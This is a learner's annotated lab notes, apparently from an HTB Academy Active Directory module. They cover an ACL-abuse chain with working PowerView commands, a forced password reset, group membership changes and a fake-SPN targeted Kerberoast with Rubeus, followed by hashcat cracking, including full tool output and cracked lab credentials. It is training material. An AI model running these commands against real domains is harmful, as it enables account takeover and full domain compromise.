@@ -1,1 +1,91 @@
+okay i remember this section and the next DCSync to be problematic for me... so lets try again.. 
 
+
+Abusing ACLs
+Once again, to recap where we are and where we want to get to. We are in control of the wley user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the adunn user who can perform the DCSync attack, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. To perform the attack chain, we have to do the following:
+
+1) Use the wley user to change the password for the damundsen user
+2) Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
+3) Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user
+
+So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a PSCredential object.
+
+
+
+
+Powershell -> right click -> run as different user -> wley:transporter@4
+
+** CAN SKIP IF LOGGED IN AS WLEY ^^^^^^^^^^ ***
+PS C:\htb> $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
+PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+
+CD C:\Tools\
+Import-Module .\powerView.ps1 
+
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+
+Next, we can use the Add-DomainGroupMember function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the pth-toolkit.
+
+
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+
+At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.
+
+
+Creating a Fake SPN
+
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+
+ .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : adunn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : adunn
+[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : notahacker/LEGIT
+[*] PwdLastSet             : 3/1/2022 11:29:08 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$F68521FB2F484981C8FDA68B79CE8769$A1CFEBA542240485F8CCB10E75B670DEC49C1D5A3D9EACA511E4ED6BA61D116C21F6C40A0052E99C8DA494ADEA75CE2C6BC5180C7B645C153F33FD69F8C1D19D5D657C631EC2D72B04F5EF2AD039A7BD39D720D96221C693921C2C2138653732F896F858961D3667E043143794C9FE233E6277E1E8EBD10DF4500DE644F242244F586B8DBF805ABFBB5D86EC0EDB098F3D3FF14A7F2C15EA1A6A72FA7C831FCF2516A1912D64BB62F2723B86012CDD64BF92237174B8B1A75AE3BC860BBC4AC7697DAAC316F6E9BFC969831EA88AEF9B9EC0560E0A6234B40F1D8FEAEA7EF00982FEE5EB68A0D99DEA274D48407137FF27DCF767279255E22708DA7D821BCE5711DDF4A6B4B924CF5284BEBB61FEAE7350B30EC1B45B3F700FBBE4E7992561844846E90291A84BD82984944B07AF4D3299BE05A0A371A1096769F95F0BF88194F3689E2B948DE5FE66A29959B08AF4C1221BB013F88881859AE93A362FCD3C97389E0BB0B7FE768C24E4E573C846E7C670DDE4C20E68B5FD7299D336036A331E3F921BBFF4B1F2BEBA7C42C26489FCD8A521ED0E27E887FEE0DF248C9CE72CF13C5BCFFA33C133B03DC3408EE74BDB8554FCC723FE48D7F3E350C4D7DAA9F79F0BB3E9FE31E92BC6DACFA77653BCD1619CFBA40359A1DA384F2C0FDA72E9CD647653E8F053036C83D91ED8F9BECAD67308A2AEA0D2308FA465F4B3EE6AC498AF120DD327C910E5710DE0361C4F50E95E2C75F04F83A19B32E20FFC42B444B31034E18A27E017C051D1F336E4F4A76BAD8601E2A21657ED2280ADADE905C928933062AFCED377643BE2FB04C9538AD59FB53429775A7EE034D4106419844020BC4A1661427C88608848A896F292096F7477E9B916968DF1C2F17C55A6E270053C82EF75544D1CE910E1077F02025893CD9970F13E0FC270257F51675AF3290FA02093B662F8AF8C7B85AAC3A884CD029C2B9D610EEE57F18B4EBEEB423BA40537AA8B7F2B04BA9C121BFD846A5F7A2499EB59EFA1325B2952903601A1C2BE144EC4C345FD33CEDD732789E79F15EBCF8E01BC8DB2C9F0E83F72574570395EFA77D3F684A21E7D7F5F589FE2868554C8E442129B75A20932A19D8EB42A1B174709EC63F398E5F58503D395BF6274D1D458F6A7A82278C150047E48CC8853123526D560CE2E672D2300CCEE109A89D1C66D047A264E340BA02DB547711114D87D75FFFFACC48DFA8AE8DD9EFAAD11B5F6FC14AFD9B039D22C255C878A02DDC0565997C8CBD020ABDE3F57352D8BA8ACFD24AC89ADF12970A513126D6E5A012E73E6E17E220658A65C9485F3285E99EBFD2EB9C17FAE9A06AE674C4FB05B2EF945248545DD514B37EA1C4F3D525E8F5A725B11E9792F974560DB1B194B458D74332B58C896019F4F553DD34D7DE50D9E5E8C1E01269EBE41F900A85EE03F93E5535C48AA271888815085DCE5BB0BE2838FD2963B41E3006E62353B13F4EEE3691CFD85A5525FD83B4E55BB2C653FB0838E23111EEA45C1D80C2C25943D17F2840EF402A85FFE3DE521E327A33824E915C637AE3817C1264EB0A9BCFEB61820B0E2EAA16F181E89DEA3D0B8CB29D1A4E502716061
+
+
+
+Copy and paste into text file on HOST machine 
+
+hashcat -m 13100 adunn /usr/share/wordlists/rockyou.txt -> SyncMaster757
+
+
+So basically... i didnt read last time. we MUST be authenticated as wley and thats where all my problems were... so pwoershell -> right click -> ru nas user -> put in credentials -> voila  -> adunn:SyncMaster757
